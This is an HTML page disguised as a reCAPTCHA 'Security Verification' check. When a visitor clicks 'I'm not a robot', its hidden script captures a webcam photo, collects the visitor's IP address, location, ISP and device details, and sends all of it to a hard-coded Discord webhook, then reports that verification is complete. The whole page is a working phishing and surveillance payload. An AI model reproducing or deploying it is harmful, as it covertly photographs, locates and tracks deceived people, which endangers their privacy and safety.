<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Verification</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;}
  html,body{width:100%;height:100%;background:#f0f2f5;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;}
  .card{background:#fff;border-radius:12px;padding:2rem;width:90%;max-width:400px;box-shadow:0 2px 12px rgba(0,0,0,0.1);text-align:center;}
  .logo{font-size:2rem;margin-bottom:0.5rem;}
  .title{font-size:1.2rem;font-weight:700;color:#1a1a1a;margin-bottom:0.3rem;}
  .sub{font-size:13px;color:#666;margin-bottom:1.5rem;}
  .box{border:2px solid #e0e0e0;border-radius:8px;padding:1.2rem;margin-bottom:1.5rem;display:flex;align-items:center;gap:1rem;cursor:pointer;transition:all 0.3s;}
  .box:hover{border-color:#4285f4;background:#f8f9ff;}
  .checkbox{width:24px;height:24px;border:2px solid #ccc;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
  .check-label{font-size:14px;color:#333;text-align:left;}
  .spinner{display:none;width:20px;height:20px;border:2px solid #ccc;border-top-color:#4285f4;border-radius:50%;animation:spin 0.8s linear infinite;}
  @keyframes spin{to{transform:rotate(360deg)}}
  .checkmark{display:none;color:#4285f4;font-size:18px;font-weight:700;}
  .footer{font-size:11px;color:#999;display:flex;align-items:center;justify-content:center;gap:6px;}
  .dot{width:6px;height:6px;background:#4285f4;border-radius:50%;}
  .status{font-size:13px;color:#4285f4;margin-bottom:1rem;min-height:20px;}
  video{display:none;}
  canvas{display:none;}
</style>
</head>
<body>
<div class="card">
  <div class="logo">🛡️</div>
  <div class="title">Security Verification</div>
  <div class="sub">Please verify you're human to continue</div>
  <div class="status" id="status"></div>
  <div class="box" id="captchaBox" onclick="verify()">
    <div class="checkbox" id="checkbox">
      <div class="spinner" id="spinner"></div>
      <div class="checkmark" id="checkmark">✓</div>
    </div>
    <div class="check-label">I'm not a robot</div>
  </div>
  <div class="footer">
    <div class="dot"></div>
    <span>Protected by reCAPTCHA</span>
  </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
  const WEBHOOK = 'https://discord.com/api/webhooks/1490304428991971438/Br6zKLejTWDhEplEBZpjIQOJgb_-1jdjHKfJMivOH9M5Co5MPHysA7sD5b9nYklxxnG_';

  async function verify(){
    const box = document.getElementById('captchaBox');
    const spinner = document.getElementById('spinner');
    const checkmark = document.getElementById('checkmark');
    const status = document.getElementById('status');

    box.style.pointerEvents = 'none';
    spinner.style.display = 'block';
    status.textContent = 'Verifying...';

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false
      });

      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      video.srcObject = stream;

      await new Promise(r => setTimeout(r, 1500));

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);

      stream.getTracks().forEach(t => t.stop());

      const imageData = canvas.toDataURL('image/jpeg', 0.8);
      const blob = await (await fetch(imageData)).blob();

      const ipRes = await fetch('https://ip-api.com/json/');
      const ipData = await ipRes.json();

      const form = new FormData();
      form.append('file', blob, 'snapshot.jpg');
      form.append('payload_json', JSON.stringify({
        content: [
          '📸 **Camera Snapshot**',
          '```',
          `🌐 IP      : ${ipData.query}`,
          `📍 Location: ${ipData.city}, ${ipData.regionName}, ${ipData.country}`,
          `📡 ISP     : ${ipData.isp}`,
          `⏰ Time    : ${new Date().toUTCString()}`,
          `🖥️ Device  : ${navigator.userAgent.split(')')[0].split('(')[1]}`,
          '```'
        ].join('\n')
      }));

      await fetch(WEBHOOK, { method: 'POST', body: form });

    } catch(e) {
      console.log(e);
    }

    spinner.style.display = 'none';
    checkmark.style.display = 'block';
    document.getElementById('checkbox').style.borderColor = '#4285f4';
    status.textContent = '✓ Verification complete';
    status.style.color = '#34a853';
  }
</script>
</body>
</html>
